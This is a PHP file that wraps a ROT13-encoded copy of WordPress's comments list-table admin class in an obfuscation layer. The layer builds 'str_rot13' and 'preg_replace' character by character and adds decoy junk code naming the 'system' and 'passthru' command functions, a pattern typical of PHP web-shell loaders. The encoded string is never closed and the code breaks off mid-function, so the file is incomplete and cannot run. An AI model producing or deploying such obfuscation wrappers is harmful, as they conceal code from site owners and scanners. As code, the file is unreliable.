<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Yvfg Gnoyr NCV: JC_Pbzzragf_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 3.1.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag qvfcynlvat pbzzragf va n yvfg gnoyr.
 *
 * @fvapr 3.1.0
 *
 * @frr JC_Yvfg_Gnoyr
 */
pynff JC_Pbzzragf_Yvfg_Gnoyr rkgraqf JC_Yvfg_Gnoyr {

	choyvp $purpxobk = gehr;

	choyvp $craqvat_pbhag = neenl();

	choyvp $rkgen_vgrzf;

	cevingr $hfre_pna;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.1.0
	 *
	 * @frr JC_Yvfg_Gnoyr::__pbafgehpg() sbe zber vasbezngvba ba qrsnhyg nethzragf.
	 *
	 * @tybony vag $cbfg_vq
	 *
	 * @cnenz neenl $netf Na nffbpvngvir neenl bs nethzragf.
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		tybony $cbfg_vq;

		$cbfg_vq = vffrg( $_ERDHRFG['c'] ) ? nofvag( $_ERDHRFG['c'] ) : 0;

		vs ( trg_bcgvba( 'fubj_ningnef' ) ) {
			nqq_svygre( 'pbzzrag_nhgube', neenl( $guvf, 'sybngrq_nqzva_ningne' ), 10, 2 );
		}

		cnerag::__pbafgehpg(
			neenl(
				'cyheny'   => 'pbzzragf',
				'fvathyne' => 'pbzzrag',
				'nwnk'     => gehr,
				'fperra'   => vffrg( $netf['fperra'] ) ? $netf['fperra'] : ahyy,
			)
		);
	}

	/**
	 * Nqqf ningnef gb pbzzrag nhgube anzrf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $anzr       Pbzzrag nhgube anzr.
	 * @cnenz vag    $pbzzrag_vq Pbzzrag VQ.
	 * @erghea fgevat Ningne jvgu gur hfre anzr.
	 */
	choyvp shapgvba sybngrq_nqzva_ningne( $anzr, $pbzzrag_vq ) {
		$pbzzrag = trg_pbzzrag( $pbzzrag_vq );
		$ningne  = trg_ningne( $pbzzrag, 32, 'zlfgrel' );
		erghea \"$ningne $anzr\";
	}

	/**
	 * @erghea obby
	 */
	choyvp shapgvba nwnk_hfre_pna() {
		erghea pheerag_hfre_pna( 'rqvg_cbfgf' );
	}

	/**
	 * @tybony fgevat $zbqr           Yvfg gnoyr ivrj zbqr.
	 * @tybony vag    $cbfg_vq
	 * @tybony fgevat $pbzzrag_fgnghf
	 * @tybony fgevat $pbzzrag_glcr
	 * @tybony fgevat $frnepu
	 */
	choyvp shapgvba cercner_vgrzf() {
		tybony $zbqr, $cbfg_vq, $pbzzrag_fgnghf, $pbzzrag_glcr, $frnepu;

		vs ( ! rzcgl( $_ERDHRFG['zbqr'] ) ) {
			$zbqr = 'rkprecg' === $_ERDHRFG['zbqr'] ? 'rkprecg' : 'yvfg';
			frg_hfre_frggvat( 'cbfgf_yvfg_zbqr', $zbqr );
		} ryfr {
			$zbqr = trg_hfre_frggvat( 'cbfgf_yvfg_zbqr', 'yvfg' );
		}

		$pbzzrag_fgnghf = vffrg( $_ERDHRFG['pbzzrag_fgnghf'] ) ? $_ERDHRFG['pbzzrag_fgnghf'] : 'nyy';

		vs ( ! va_neenl( $pbzzrag_fgnghf, neenl( 'nyy', 'zvar', 'zbqrengrq', 'nccebirq', 'fcnz', 'genfu' ), gehr ) ) {
			$pbzzrag_fgnghf = 'nyy';
		}

		$pbzzrag_glcr = ! rzcgl( $_ERDHRFG['pbzzrag_glcr'] ) ? $_ERDHRFG['pbzzrag_glcr'] : '';

		$frnepu = ( vffrg( $_ERDHRFG['f'] ) ) ? $_ERDHRFG['f'] : '';

		$cbfg_glcr = ( vffrg( $_ERDHRFG['cbfg_glcr'] ) ) ? fnavgvmr_xrl( $_ERDHRFG['cbfg_glcr'] ) : '';

		$hfre_vq = ( vffrg( $_ERDHRFG['hfre_vq'] ) ) ? $_ERDHRFG['hfre_vq'] : '';

		$beqreol = ( vffrg( $_ERDHRFG['beqreol'] ) ) ? $_ERDHRFG['beqreol'] : '';
		$beqre   = ( vffrg( $_ERDHRFG['beqre'] ) ) ? $_ERDHRFG['beqre'] : '';

		$pbzzragf_cre_cntr = $guvf->trg_cre_cntr( $pbzzrag_fgnghf );

		$qbvat_nwnk = jc_qbvat_nwnk();

		vs ( vffrg( $_ERDHRFG['ahzore'] ) ) {
			$ahzore = (vag) $_ERDHRFG['ahzore'];
		} ryfr {
			$ahzore = $pbzzragf_cre_cntr + zva( 8, $pbzzragf_cre_cntr ); // Teno n srj rkgen.
		}

		$cntr = $guvf->trg_cntrahz();

		vs ( vffrg( $_ERDHRFG['fgneg'] ) ) {
			$fgneg = $_ERDHRFG['fgneg'];
		} ryfr {
			$fgneg = ( $cntr - 1 ) * $pbzzragf_cre_cntr;
		}

		vs ( $qbvat_nwnk && vffrg( $_ERDHRFG['bssfrg'] ) ) {
			$fgneg += $_ERDHRFG['bssfrg'];
		}

		$fgnghf_znc = neenl(
			'zvar'      => '',
			'zbqrengrq' => 'ubyq',
			'nccebirq'  => 'nccebir',
			'nyy'       => '',
		);

		$netf = neenl(
			'fgnghf'                    => vffrg( $fgnghf_znc[ $pbzzrag_fgnghf ] ) ? $fgnghf_znc[ $pbzzrag_fgnghf ] : $pbzzrag_fgnghf,
			'frnepu'                    => $frnepu,
			'hfre_vq'                   => $hfre_vq,
			'bssfrg'                    => $fgneg,
			'ahzore'                    => $ahzore,
			'cbfg_vq'                   => $cbfg_vq,
			'glcr'                      => $pbzzrag_glcr,
			'beqreol'                   => $beqreol,
			'beqre'                     => $beqre,
			'cbfg_glcr'                 => $cbfg_glcr,
			'hcqngr_pbzzrag_cbfg_pnpur' => gehr,
		);

		/**
		 * Svygref gur nethzragf sbe gur pbzzrag dhrel va gur pbzzragf yvfg gnoyr.
		 *
		 * @fvapr 5.1.0
		 *
		 * @cnenz neenl $netf Na neenl bs trg_pbzzragf() nethzragf.
		 */
		$netf = nccyl_svygref( 'pbzzragf_yvfg_gnoyr_dhrel_netf', $netf );

		$_pbzzragf = trg_pbzzragf( $netf );

		vs ( vf_neenl( $_pbzzragf ) ) {
			$guvf->vgrzf       = neenl_fyvpr( $_pbzzragf, 0, $pbzzragf_cre_cntr );
			$guvf->rkgen_vgrzf = neenl_fyvpr( $_pbzzragf, $pbzzragf_cre_cntr );

			$_pbzzrag_cbfg_vqf = neenl_havdhr( jc_yvfg_cyhpx( $_pbzzragf, 'pbzzrag_cbfg_VQ' ) );

			$guvf->craqvat_pbhag = trg_craqvat_pbzzragf_ahz( $_pbzzrag_cbfg_vqf );
		}

		$gbgny_pbzzragf = trg_pbzzragf(
			neenl_zretr(
				$netf,
				neenl(
					'pbhag'   => gehr,
					'bssfrg'  => 0,
					'ahzore'  => 0,
					'beqreol' => 'abar',
				)
			)
		);

		$guvf->frg_cntvangvba_netf(
			neenl(
				'gbgny_vgrzf' => $gbgny_pbzzragf,
				'cre_cntr'    => $pbzzragf_cre_cntr,
			)
		);
	}

	/**
	 * @cnenz fgevat $pbzzrag_fgnghf
	 * @erghea vag
	 */
	choyvp shapgvba trg_cre_cntr( $pbzzrag_fgnghf = 'nyy' ) {
		$pbzzragf_cre_cntr = $guvf->trg_vgrzf_cre_cntr( 'rqvg_pbzzragf_cre_cntr' );

		/**
		 * Svygref gur ahzore bs pbzzragf yvfgrq cre cntr va gur pbzzragf yvfg gnoyr.
		 *
		 * @fvapr 2.6.0
		 *
		 * @cnenz vag    $pbzzragf_cre_cntr Gur ahzore bs pbzzragf gb yvfg cre cntr.
		 * @cnenz fgevat $pbzzrag_fgnghf    Gur pbzzrag fgnghf anzr. Qrsnhyg 'Nyy'.
		 */
		erghea nccyl_svygref( 'pbzzragf_cre_cntr', $pbzzragf_cre_cntr, $pbzzrag_fgnghf );
	}

	/**
	 * @tybony fgevat $pbzzrag_fgnghf
	 */
	choyvp shapgvba ab_vgrzf() {
		tybony $pbzzrag_fgnghf;

		vs ( 'zbqrengrq' === $pbzzrag_fgnghf ) {
			_r( 'Ab pbzzragf njnvgvat zbqrengvba.' );
		} ryfrvs ( 'genfu' === $pbzzrag_fgnghf ) {
			_r( 'Ab pbzzragf sbhaq va Genfu.' );
		} ryfr {
			_r( 'Ab pbzzragf sbhaq.' );
		}
	}

	/**
	 * @tybony vag $cbfg_vq
	 * @tybony fgevat $pbzzrag_fgnghf
	 * @tybony fgevat $pbzzrag_glcr
	 */
	cebgrpgrq shapgvba trg_ivrjf() {
		tybony $cbfg_vq, $pbzzrag_fgnghf, $pbzzrag_glcr;

		$fgnghf_yvaxf = neenl();
		$ahz_pbzzragf = ( $cbfg_vq ) ? jc_pbhag_pbzzragf( $cbfg_vq ) : jc_pbhag_pbzzragf();

		$fgnghfrf = neenl(
			/* genafyngbef: %f: Ahzore bs pbzzragf. */
			'nyy'       => _ak_abbc(
				'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
				'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
				'pbzzragf'
			), // Fvathyne abg hfrq.

			/* genafyngbef: %f: Ahzore bs pbzzragf. */
			'zvar'      => _ak_abbc(
				'Zvar <fcna pynff=\"pbhag\">(%f)</fcna>',
				'Zvar <fcna pynff=\"pbhag\">(%f)</fcna>',
				'pbzzragf'
			),

			/* genafyngbef: %f: Ahzore bs pbzzragf. */
			'zbqrengrq' => _ak_abbc(
				'Craqvat <fcna pynff=\"pbhag\">(%f)</fcna>',
				'Craqvat <fcna pynff=\"pbhag\">(%f)</fcna>',
				'pbzzragf'
			),

			/* genafyngbef: %f: Ahzore bs pbzzragf. */
			'nccebirq'  => _ak_abbc(
				'Nccebirq <fcna pynff=\"pbhag\">(%f)</fcna>',
				'Nccebirq <fcna pynff=\"pbhag\">(%f)</fcna>',
				'pbzzragf'
			),

			/* genafyngbef: %f: Ahzore bs pbzzragf. */
			'fcnz'      => _ak_abbc(
				'Fcnz <fcna pynff=\"pbhag\">(%f)</fcna>',
				'Fcnz <fcna pynff=\"pbhag\">(%f)</fcna>',
				'pbzzragf'
			),

			/* genafyngbef: %f: Ahzore bs pbzzragf. */
			'genfu'     => _ak_abbc(
				'Genfu <fcna pynff=\"pbhag\">(%f)</fcna>',
				'Genfu <fcna pynff=\"pbhag\">(%f)</fcna>',
				'pbzzragf'
			),
		);

		vs ( ! RZCGL_GENFU_QNLF ) {
			hafrg( $fgnghfrf['genfu'] );
		}

		$yvax = nqzva_hey( 'rqvg-pbzzragf.cuc' );

		vs ( ! rzcgl( $pbzzrag_glcr ) && 'nyy' !== $pbzzrag_glcr ) {
			$yvax = nqq_dhrel_net( 'pbzzrag_glcr', $pbzzrag_glcr, $yvax );
		}

		sbernpu ( $fgnghfrf nf $fgnghf => $ynory ) {
			vs ( 'zvar' === $fgnghf ) {
				$pheerag_hfre_vq    = trg_pheerag_hfre_vq();
				$ahz_pbzzragf->zvar = trg_pbzzragf(
					neenl(
						'cbfg_vq' => $cbfg_vq ? $cbfg_vq : 0,
						'hfre_vq' => $pheerag_hfre_vq,
						'pbhag'   => gehr,
						'beqreol' => 'abar',
					)
				);
				$yvax               = nqq_dhrel_net( 'hfre_vq', $pheerag_hfre_vq, $yvax );
			} ryfr {
				$yvax = erzbir_dhrel_net( 'hfre_vq', $yvax );
			}

			vs ( ! vffrg( $ahz_pbzzragf->$fgnghf ) ) {
				$ahz_pbzzragf->$fgnghf = 10;
			}

			$yvax = nqq_dhrel_net( 'pbzzrag_fgnghf', $fgnghf, $yvax );

			vs ( $cbfg_vq ) {
				$yvax = nqq_dhrel_net( 'c', nofvag( $cbfg_vq ), $yvax );
			}

			/*
			// V gblrq jvgu guvf, ohg qrpvqrq ntnvafg vg. Yrnivat vg va urer va pnfr nalbar guvaxf vg vf n tbbq vqrn. ~ Znex
			vs ( !rzcgl( $_ERDHRFG['f'] ) )
				$yvax = nqq_dhrel_net( 'f', rfp_ngge( jc_hafynfu( $_ERDHRFG['f'] ) ), $yvax );
			*/

			$fgnghf_yvaxf[ $fgnghf ] = neenl(
				'hey'     => rfp_hey( $yvax ),
				'ynory'   => fcevags(
					genafyngr_abbcrq_cyheny( $ynory, $ahz_pbzzragf->$fgnghf ),
					fcevags(
						'<fcna pynff=\"%f-pbhag\">%f</fcna>',
						( 'zbqrengrq' === $fgnghf ) ? 'craqvat' : $fgnghf,
						ahzore_sbezng_v18a( $ahz_pbzzragf->$fgnghf )
					)
				),
				'pheerag' => $fgnghf === $pbzzrag_fgnghf,
			);
		}

		/**
		 * Svygref gur pbzzrag fgnghf yvaxf.
		 *
		 * @fvapr 2.5.0
		 * @fvapr 5.1.0 Gur 'Zvar' yvax jnf nqqrq.
		 *
		 * @cnenz fgevat[] $fgnghf_yvaxf Na nffbpvngvir neenl bs shyyl-sbezrq pbzzrag fgnghf yvaxf. Vapyhqrf 'Nyy', 'Zvar',
		 *                              'Craqvat', 'Nccebirq', 'Fcnz', naq 'Genfu'.
		 */
		erghea nccyl_svygref( 'pbzzrag_fgnghf_yvaxf', $guvf->trg_ivrjf_yvaxf( $fgnghf_yvaxf ) );
	}

	/**
	 * @tybony fgevat $pbzzrag_fgnghf
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ohyx_npgvbaf() {
		tybony $pbzzrag_fgnghf;

		vs ( ! pheerag_hfre_pna( 'zbqrengr_pbzzragf' ) ) {
			erghea neenl(); // Erghea na rzcgl neenl vs gur hfre qbrfa'g unir crezvffvba
		}

		$npgvbaf = neenl();

		vs ( va_neenl( $pbzzrag_fgnghf, neenl( 'nyy', 'nccebirq' ), gehr ) ) {
			$npgvbaf['hanccebir'] = __( 'Hanccebir' );
		}

		vs ( va_neenl( $pbzzrag_fgnghf, neenl( 'nyy', 'zbqrengrq' ), gehr ) ) {
			$npgvbaf['nccebir'] = __( 'Nccebir' );
		}

		vs ( va_neenl( $pbzzrag_fgnghf, neenl( 'nyy', 'zbqrengrq', 'nccebirq', 'genfu' ), gehr ) ) {
			$npgvbaf['fcnz'] = _k( 'Znex nf fcnz', 'pbzzrag' );
		}

		vs ( 'genfu' === $pbzzrag_fgnghf ) {
			$npgvbaf['hagenfu'] = __( 'Erfgber' );
		} ryfrvs ( 'fcnz' === $pbzzrag_fgnghf ) {
			$npgvbaf['hafcnz'] = _k( 'Abg fcnz', 'pbzzrag' );
		}

		vs ( va_neenl( $pbzzrag_fgnghf, neenl( 'genfu', 'fcnz' ), gehr ) || ! RZCGL_GENFU_QNLF ) {
			$npgvbaf['qryrgr'] = __( 'Qryrgr creznaragyl' );
		} ryfr {
			$npgvbaf['genfu'] = __( 'Zbir gb Genfu' );
		}

		erghea $npgvbaf;
	}

	/**
	 * @tybony fgevat $pbzzrag_fgnghf
	 * @tybony fgevat $pbzzrag_glcr
	 *
	 * @cnenz fgevat $juvpu
	 */
	cebgrpgrq shapgvba rkgen_gnoyrani( $juvpu ) {
		tybony $pbzzrag_fgnghf, $pbzzrag_glcr;
		fgngvp $unf_vgrzf;

		vs ( ! vffrg( $unf_vgrzf ) ) {
			$unf_vgrzf = $guvf->unf_vgrzf();
		}

		rpub '<qvi pynff=\"nyvtayrsg npgvbaf\">';

		vs ( 'gbc' === $juvpu ) {
			bo_fgneg();

			$guvf->pbzzrag_glcr_qebcqbja( $pbzzrag_glcr );

			/**
			 * Sverf whfg orsber gur Svygre fhozvg ohggba sbe pbzzrag glcrf.
			 *
			 * @fvapr 3.5.0
			 */
			qb_npgvba( 'erfgevpg_znantr_pbzzragf' );

			$bhgchg = bo_trg_pyrna();

			vs ( ! rzcgl( $bhgchg ) && $guvf->unf_vgrzf() ) {
				rpub $bhgchg;
				fhozvg_ohggba( __( 'Svygre' ), '', 'svygre_npgvba', snyfr, neenl( 'vq' => 'cbfg-dhrel-fhozvg' ) );
			}
		}

		vs ( ( 'fcnz' === $pbzzrag_fgnghf || 'genfu' === $pbzzrag_fgnghf ) && $unf_vgrzf
			&& pheerag_hfre_pna( 'zbqrengr_pbzzragf' )
		) {
			jc_abapr_svryq( 'ohyx-qrfgebl', '_qrfgebl_abapr' );
			$gvgyr = ( 'fcnz' === $pbzzrag_fgnghf ) ? rfp_ngge__( 'Rzcgl Fcnz' ) : rfp_ngge__( 'Rzcgl Genfu' );
			fhozvg_ohggba( $gvgyr, 'nccyl', 'qryrgr_nyy', snyfr );
		}

		/**
		 * Sverf nsgre gur Svygre fhozvg ohggba sbe pbzzrag glcrf.
		 *
		 * @fvapr 2.5.0
		 * @fvapr 5.6.0 Gur `$juvpu` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz fgevat $pbzzrag_fgnghf Gur pbzzrag fgnghf anzr. Qrsnhyg 'Nyy'.
		 * @cnenz fgevat $juvpu          Gur ybpngvba bs gur rkgen gnoyr ani znexhc: Rvgure 'gbc' be 'obggbz'.
		 */
		qb_npgvba( 'znantr_pbzzragf_ani', $pbzzrag_fgnghf, $juvpu );

		rpub '</qvi>';
	}

	/**
	 * @erghea fgevat|snyfr
	 */
	choyvp shapgvba pheerag_npgvba() {
		vs ( vffrg( $_ERDHRFG['qryrgr_nyy'] ) || vffrg( $_ERDHRFG['qryrgr_nyy2'] ) ) {
			erghea 'qryrgr_nyy';
		}

		erghea cnerag::pheerag_npgvba();
	}

	/**
	 * @tybony vag $cbfg_vq
	 *
	 * @erghea fgevat[] Neenl bs pbyhza gvgyrf xrlrq ol gurve pbyhza anzr.
	 */
	choyvp shapgvba trg_pbyhzaf() {
		tybony $cbfg_vq;

		$pbyhzaf = neenl();

		vs ( $guvf->purpxobk ) {
			$pbyhzaf['po'] = '<vachg glcr=\"purpxobk\" />';
		}

		$pbyhzaf['nhgube']  = __( 'Nhgube' );
		$pbyhzaf['pbzzrag'] = _k( 'Pbzzrag', 'pbyhza anzr' );

		vs ( ! $cbfg_vq ) {
			/* genafyngbef: Pbyhza anzr be gnoyr ebj urnqre. */
			$pbyhzaf['erfcbafr'] = __( 'Va erfcbafr gb' );
		}

		$pbyhzaf['qngr'] = _k( 'Fhozvggrq ba', 'pbyhza anzr' );

		erghea $pbyhzaf;
	}

	/**
	 * Qvfcynlf n pbzzrag glcr qebc-qbja sbe svygrevat ba gur Pbzzragf yvfg gnoyr.
	 *
	 * @fvapr 5.5.0
	 * @fvapr 5.6.0 Eranzrq sebz `pbzzrag_fgnghf_qebcqbja()` gb `pbzzrag_glcr_qebcqbja()`.
	 *
	 * @cnenz fgevat $pbzzrag_glcr Gur pheerag pbzzrag glcr fyht.
	 */
	cebgrpgrq shapgvba pbzzrag_glcr_qebcqbja( $pbzzrag_glcr ) {
		/**
		 * Svygref gur pbzzrag glcrf fubja va gur qebc-qbja zrah ba gur Pbzzragf yvfg gnoyr.
		 *
		 * @fvapr 2.7.0
		 *
		 * @cnenz fgevat[] $pbzzrag_glcrf Neenl bs pbzzrag glcr ynoryf xrlrq ol gurve anzr.
		 */
		$pbzzrag_glcrf = nccyl_svygref(
			'nqzva_pbzzrag_glcrf_qebcqbja',
			neenl(
				'pbzzrag' => __( 'Pbzzragf' ),
				'cvatf'   => __( 'Cvatf' ),
			)
		);

		vs ( $pbzzrag_glcrf && vf_neenl( $pbzzrag_glcrf ) ) {
			cevags(
				'<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"svygre-ol-pbzzrag-glcr\">%f</ynory>',
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Svygre ol pbzzrag glcr' )
			);

			rpub '<fryrpg vq=\"svygre-ol-pbzzrag-glcr\" anzr=\"pbzzrag_glcr\">';

			cevags( \"\g<bcgvba inyhr=''>%f</bcgvba>\", __( 'Nyy pbzzrag glcrf' ) );

			sbernpu ( $pbzzrag_glcrf nf $glcr => $ynory ) {
				vs ( trg_pbzzragf(
					neenl(
						'pbhag'   => gehr,
						'beqreol' => 'abar',
						'glcr'    => $glcr,
					)
				) ) {
					cevags(
						\"\g<bcgvba inyhr='%f'%f>%f</bcgvba>\a\",
						rfp_ngge( $glcr ),
						fryrpgrq( $pbzzrag_glcr, $glcr, snyfr ),
						rfp_ugzy( $ynory )
					);
				}
			}

			rpub '</fryrpg>';
		}
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_fbegnoyr_pbyhzaf() {
		erghea neenl(
			'nhgube'   => neenl( 'pbzzrag_nhgube', snyfr, __( 'Nhgube' ), __( 'Gnoyr beqrerq ol Pbzzrag Nhgube.' ) ),
			'erfcbafr' => neenl( 'pbzzrag_cbfg_VQ', snyfr, _k( 'Va Erfcbafr Gb', 'pbyhza anzr' ), __( 'Gnoyr beqrerq ol Cbfg Ercyvrq Gb.' ) ),
			'qngr'     => 'pbzzrag_qngr',
		);
	}

	/**
	 * Trgf gur anzr bs gur qrsnhyg cevznel pbyhza.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea fgevat Anzr bs gur qrsnhyg cevznel pbyhza, va guvf pnfr, 'pbzzrag'.
	 */
	cebgrpgrq shapgvba trg_qrsnhyg_cevznel_pbyhza_anzr() {
		erghea 'pbzzrag';
	}

	/**
	 * Qvfcynlf gur pbzzragf gnoyr.
	 *
	 * Bireevqrf gur cnerag qvfcynl() zrgubq gb eraqre rkgen pbzzragf.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba qvfcynl() {
		jc_abapr_svryq( 'srgpu-yvfg-' . trg_pynff( $guvf ), '_nwnk_srgpu_yvfg_abapr' );
		fgngvp $unf_vgrzf;

		vs ( ! vffrg( $unf_vgrzf ) ) {
			$unf_vgrzf = $guvf->unf_vgrzf();

			vs ( $unf_vgrzf ) {
				$guvf->qvfcynl_gnoyrani( 'gbc' );
			}
		}

		$guvf->fperra->eraqre_fperra_ernqre_pbagrag( 'urnqvat_yvfg' );

		?>
<gnoyr pynff=\"jc-yvfg-gnoyr <?cuc rpub vzcybqr( ' ', $guvf->trg_gnoyr_pynffrf() ); ?>\">
		<?cuc
		vs ( ! vffrg( $_TRG['beqreol'] ) ) {
			// Va gur vavgvny ivrj, Pbzzragf ner beqrerq ol pbzzrag'f qngr ohg gurer'f ab pbyhza sbe gung.
			rpub '<pncgvba pynff=\"fperra-ernqre-grkg\">' .
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			__( 'Beqrerq ol Pbzzrag Qngr, qrfpraqvat.' ) .
			'</pncgvba>';
		} ryfr {
			$guvf->cevag_gnoyr_qrfpevcgvba();
		}
		?>
	<gurnq>
	<ge>
		<?cuc $guvf->cevag_pbyhza_urnqref(); ?>
	</ge>
	</gurnq>

	<gobql vq=\"gur-pbzzrag-yvfg\" qngn-jc-yvfgf=\"yvfg:pbzzrag\">
		<?cuc $guvf->qvfcynl_ebjf_be_cynprubyqre(); ?>
	</gobql>

	<gobql vq=\"gur-rkgen-pbzzrag-yvfg\" qngn-jc-yvfgf=\"yvfg:pbzzrag\" fglyr=\"qvfcynl: abar;\">
		<?cuc
			/*
			 * Onpx hc gur vgrzf gb erfgber nsgre cevagvat gur rkgen vgrzf znexhc.
			 * Gur rkgen vgrzf znl or rzcgl, juvpu jvyy cerirag gur gnoyr ani sebz qvfcynlvat yngre.
			 */
			$vgrzf       = $guvf->vgrzf;
			$guvf->vgrzf = $guvf->rkgen_vgrzf;
			$guvf->qvfcynl_ebjf_be_cynprubyqre();
			$guvf->vgrzf = $vgrzf;
		?>
	</gobql>

	<gsbbg>
	<ge>
		<?cuc $guvf->cevag_pbyhza_urnqref( snyfr ); ?>
	</ge>
	</gsbbg>

</gnoyr>
		<?cuc

		$guvf->qvfcynl_gnoyrani( 'obggbz' );
	}

	/**
	 * @tybony JC_Cbfg    $cbfg    Tybony cbfg bowrpg.
	 * @tybony JC_Pbzzrag $pbzzrag Tybony pbzzrag bowrpg.
	 *
	 * @cnenz JC_Pbzzrag $vgrz
	 */
	choyvp shapgvba fvatyr_ebj( $vgrz ) {
		tybony $cbfg, $pbzzrag;

		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$pbzzrag = $vgrz;

		vs ( $pbzzrag->pbzzrag_cbfg_VQ > 0 ) {
			$cbfg = trg_cbfg( $pbzzrag->pbzzrag_cbfg_VQ );
		}

		$rqvg_cbfg_pnc = $cbfg ? 'rqvg_cbfg' : 'rqvg_cbfgf';

		vs ( ! pheerag_hfre_pna( $rqvg_cbfg_pnc, $pbzzrag->pbzzrag_cbfg_VQ )
			&& ( cbfg_cnffjbeq_erdhverq( $pbzzrag->pbzzrag_cbfg_VQ )
				|| ! pheerag_hfre_pna( 'ernq_cbfg', $pbzzrag->pbzzrag_cbfg_VQ ) )
		) {
			// Gur hfre unf ab npprff gb gur cbfg naq guhf pnaabg frr gur pbzzragf.
			erghea snyfr;
		}

		$gur_pbzzrag_pynff = jc_trg_pbzzrag_fgnghf( $pbzzrag );

		vs ( ! $gur_pbzzrag_pynff ) {
			$gur_pbzzrag_pynff = '';
		}

		$gur_pbzzrag_pynff = vzcybqr( ' ', trg_pbzzrag_pynff( $gur_pbzzrag_pynff, $pbzzrag, $pbzzrag->pbzzrag_cbfg_VQ ) );

		$guvf->hfre_pna = pheerag_hfre_pna( 'rqvg_pbzzrag', $pbzzrag->pbzzrag_VQ );

		rpub \"<ge vq='pbzzrag-$pbzzrag->pbzzrag_VQ' pynff='$gur_pbzzrag_pynff'>\";
		$guvf->fvatyr_ebj_pbyhzaf( $pbzzrag );
		rpub \"</ge>\a\";

		hafrg( $TYBONYF['cbfg'], $TYBONYF['pbzzrag'] );
	}

	/**
	 * Trarengrf naq qvfcynlf ebj npgvbaf yvaxf.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$pbzzrag` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @tybony fgevat $pbzzrag_fgnghf Fgnghf sbe gur pheerag yvfgrq pbzzragf.
	 *
	 * @cnenz JC_Pbzzrag $vgrz        Gur pbzzrag bowrpg.
	 * @cnenz fgevat     $pbyhza_anzr Pheerag pbyhza anzr.
	 * @cnenz fgevat     $cevznel     Cevznel pbyhza anzr.
	 * @erghea fgevat Ebj npgvbaf bhgchg sbe pbzzragf. Na rzcgl fgevat
	 *                vs gur pheerag pbyhza vf abg gur cevznel pbyhza,
	 *                be vs gur pheerag hfre pnaabg rqvg gur pbzzrag.
	 */
	cebgrpgrq shapgvba unaqyr_ebj_npgvbaf( $vgrz, $pbyhza_anzr, $cevznel ) {
		tybony $pbzzrag_fgnghf;

		vs ( $cevznel !== $pbyhza_anzr ) {
			erghea '';
		}

		vs ( ! $guvf->hfre_pna ) {
			erghea '';
		}

		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$pbzzrag = $vgrz;

		$gur_pbzzrag_fgnghf = jc_trg_pbzzrag_fgnghf( $pbzzrag );

		$bhgchg = '';

		$nccebir_abapr = rfp_ugzy( '_jcabapr=' . jc_perngr_abapr( 'nccebir-pbzzrag_' . $pbzzrag->pbzzrag_VQ ) );
		$qry_abapr     = rfp_ugzy( '_jcabapr=' . jc_perngr_abapr( 'qryrgr-pbzzrag_' . $pbzzrag->pbzzrag_VQ ) );

		$npgvba_fgevat = 'pbzzrag.cuc?npgvba=%f&p=' . $pbzzrag->pbzzrag_VQ . '&%f';

		$nccebir_hey   = fcevags( $npgvba_fgevat, 'nccebirpbzzrag', $nccebir_abapr );
		$hanccebir_hey = fcevags( $npgvba_fgevat, 'hanccebirpbzzrag', $nccebir_abapr );
		$fcnz_hey      = fcevags( $npgvba_fgevat, 'fcnzpbzzrag', $qry_abapr );
		$hafcnz_hey    = fcevags( $npgvba_fgevat, 'hafcnzpbzzrag', $qry_abapr );
		$genfu_hey     = fcevags( $npgvba_fgevat, 'genfupbzzrag', $qry_abapr );
		$hagenfu_hey   = fcevags( $npgvba_fgevat, 'hagenfupbzzrag', $qry_abapr );
		$qryrgr_hey    = fcevags( $npgvba_fgevat, 'qryrgrpbzzrag', $qry_abapr );

		// Cerbeqre vg: Nccebir | Ercyl | Dhvpx Rqvg | Rqvg | Fcnz | Genfu.
		$npgvbaf = neenl(
			'nccebir'   => '',
			'hanccebir' => '',
			'ercyl'     => '',
			'dhvpxrqvg' => '',
			'rqvg'      => '',
			'fcnz'      => '',
			'hafcnz'    => '',
			'genfu'     => '',
			'hagenfu'   => '',
			'qryrgr'    => '',
		);

		// Abg ybbxvat ng nyy pbzzragf.
		vs ( $pbzzrag_fgnghf && 'nyy' !== $pbzzrag_fgnghf ) {
			vs ( 'nccebirq' === $gur_pbzzrag_fgnghf ) {
				$npgvbaf['hanccebir'] = fcevags(
					'<n uers=\"%f\" qngn-jc-yvfgf=\"%f\" pynff=\"ivz-h ivz-qrfgehpgvir nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
					rfp_hey( $hanccebir_hey ),
